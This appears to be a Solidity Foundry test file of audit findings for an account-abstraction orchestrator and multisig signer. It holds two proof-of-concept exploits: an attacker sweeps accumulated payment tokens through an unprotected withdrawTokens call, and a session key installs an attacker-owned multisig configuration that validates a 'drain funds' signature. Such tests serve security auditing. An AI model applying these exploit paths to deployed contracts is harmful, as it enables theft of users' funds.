// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../Base.t.sol";
import {MultiSigSigner} from "../../src/MultiSigSigner.sol";

contract TestFindings is BaseTest {
    address internal constant cafeBabe = address(0xcafebabe);
    uint256 internal constant combinedGas = 10_000_000;

    address internal attacker;

    function setUp() public override {
        super.setUp();
        attacker = makeAddr("attacker");
    }

    function test_orchestratorPaymentsSweep() public {
        DelegatedEOA memory d1;
        PassKey memory k1;
        Orchestrator.Intent memory u1;
        (d1, k1, u1) = _createFullDataToExecute(cafeBabe, 1 ether, 0.1 ether, 0.5 ether);

        assertEq(oc.execute(abi.encode(u1)), bytes4(0));
        assertEq(paymentToken.balanceOf(address(oc)), 0.1 ether);

        DelegatedEOA memory d2;
        PassKey memory k2;
        Orchestrator.Intent memory u2;
        (d2, k2, u2) = _createFullDataToExecute(cafeBabe, 2 ether, 0.5 ether, 0.5 ether);

        k2.k.isSuperAdmin = true;
        vm.prank(d2.eoa);
        d2.d.authorize(k2.k);

        assertEq(oc.execute(abi.encode(u2)), bytes4(0));
        assertEq(paymentToken.balanceOf(address(oc)), 0.6 ether);

        vm.prank(attacker);
        oc.withdrawTokens(address(paymentToken), attacker, paymentToken.balanceOf(address(oc)));

        assertEq(paymentToken.balanceOf(address(oc)), 0);
        assertEq(paymentToken.balanceOf(attacker), 0.6 ether);
    }

    function test_initConfigNoAuthCheck() public {
        MultiSigSigner multiSigSigner = new MultiSigSigner();
        DelegatedEOA memory d = _createDelegatedEOAAndDeal();

        IthacaAccount.Key memory multiSigKey = _createExternalKey(address(multiSigSigner), true);
        bytes32 multiSigKeyHash = _hash(multiSigKey);

        PassKey memory sessionKey = _randomSecp256k1PassKey();
        PassKey memory attackerOwner = _randomSecp256k1PassKey();

        vm.startPrank(d.eoa);
        d.d.authorize(multiSigKey);
        d.d.authorize(sessionKey.k);
        d.d.authorize(attackerOwner.k);
        d.d.setCanExecute(
            sessionKey.keyHash,
            address(multiSigSigner),
            MultiSigSigner.initConfig.selector,
            true
        );
        vm.stopPrank();

        Orchestrator.Intent memory intent = _createInitConfigIntent(
            d, sessionKey, address(multiSigSigner), multiSigKeyHash, 1, attackerOwner.keyHash
        );

        assertEq(oc.execute(abi.encode(intent)), bytes4(0));

        (uint256 threshold, bytes32[] memory owners) =
            multiSigSigner.getConfig(address(d.d), multiSigKeyHash);
        assertEq(threshold, 1);
        assertEq(owners[0], attackerOwner.keyHash);

        vm.prank(address(d.d));
        vm.expectRevert(MultiSigSigner.ConfigAlreadySet.selector);
        multiSigSigner.initConfig(multiSigKeyHash, 2, new bytes32[](2));

        bytes32 digest = keccak256("drain funds");
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = _sig(attackerOwner, digest);

        vm.prank(address(d.d));
        assertEq(
            multiSigSigner.isValidSignatureWithKeyHash(digest, multiSigKeyHash, abi.encode(sigs)),
            bytes4(0x8afc93b4)
        );
    }

    function _createFullDataToExecute(
        address to,
        uint256 amount,
        uint256 paymentAmount,
        uint256 paymentMaxAmount
    )
        internal
        returns (DelegatedEOA memory d, PassKey memory k, Orchestrator.Intent memory intent)
    {
        d = _createDelegatedEOAAndDeal();
        k = _createPassKeyAndAuthorize(d);
        intent = _createIntent(d, k, to, amount, paymentAmount, paymentMaxAmount);
    }

    function _createIntent(
        DelegatedEOA memory d,
        PassKey memory k,
        address to,
        uint256 amount,
        uint256 paymentAmount,
        uint256 paymentMaxAmount
    ) internal view returns (Orchestrator.Intent memory intent) {
        intent.eoa = d.eoa;
        intent.nonce = d.d.getNonce(0);
        intent.executionData = _transferExecutionData(address(paymentToken), to, amount);
        intent.paymentToken = address(paymentToken);
        intent.paymentAmount = paymentAmount;
        intent.paymentMaxAmount = paymentMaxAmount;
        intent.paymentRecipient = address(oc);
        intent.combinedGas = combinedGas;
        intent.signature = _sig(k, intent);
    }

    function _createExternalKey(address signer, bool isSuperAdmin)
        internal
        pure
        returns (IthacaAccount.Key memory k)
    {
        k.keyType = IthacaAccount.KeyType.External;
        k.isSuperAdmin = isSuperAdmin;
        k.publicKey = abi.encodePacked(signer, bytes12(0));
    }

    function _createInitConfigIntent(
        DelegatedEOA memory d,
        PassKey memory k,
        address multiSigSigner,
        bytes32 targetKeyHash,
        uint256 threshold,
        bytes32 ownerKeyHash
    ) internal view returns (Orchestrator.Intent memory intent) {
        bytes32[] memory ownerKeyHashes = new bytes32[](1);
        ownerKeyHashes[0] = ownerKeyHash;

        ERC7821.Call[] memory calls = new ERC7821.Call[](1);
        calls[0].to = multiSigSigner;
        calls[0].data = abi.encodeWithSelector(
            MultiSigSigner.initConfig.selector, targetKeyHash, threshold, ownerKeyHashes
        );

        intent.eoa = d.eoa;
        intent.nonce = d.d.getNonce(0);
        intent.executionData = abi.encode(calls);
        intent.combinedGas = combinedGas;
        intent.signature = _sig(k, intent);
    }

    ////////////////////////////////////////////////////////////////////////
    // Shared Helpers
    ////////////////////////////////////////////////////////////////////////

    function _createDelegatedEOAAndDeal() internal returns (DelegatedEOA memory d) {
        d = _randomEIP7702DelegatedEOA();
        vm.deal(d.eoa, 10 ether);
        paymentToken.mint(d.eoa, 50 ether);
    }

    function _createPassKeyAndAuthorize(DelegatedEOA memory d) internal returns (PassKey memory k) {
        k = _randomSecp256k1PassKey();
        k.k.isSuperAdmin = true;
        vm.prank(d.eoa);
        d.d.authorize(k.k);
    }
}
